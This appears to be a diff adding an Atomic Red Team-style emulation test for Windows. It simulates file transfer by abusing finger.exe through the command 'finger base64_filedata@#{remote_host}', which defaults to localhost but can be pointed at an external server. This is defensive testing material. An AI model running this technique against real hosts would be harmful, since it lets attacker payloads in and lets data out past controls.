@@ -1,0 +1,31 @@
+{
+  "id": "5f507e45-8411-4f99-84e7-e38530c45d01",
+  "name": "File download with finger.exe on Windows",
+  "description": "Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.\nBecause this is being tested on the localhost, you should not be expecting a successful connection\nhttps://www.exploit-db.com/exploits/48815\nhttps://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "cc332bc3-2755-48df-b0e2-148220c01202",
+      "type": "execute-command",
+      "data": {
+        "command": "finger base64_filedata@#{remote_host}\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1105",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "remote_host",
+      "type": "string",
+      "description": "Remote hostname or IP address",
+      "value": "localhost"
+    }
+  ]
+}
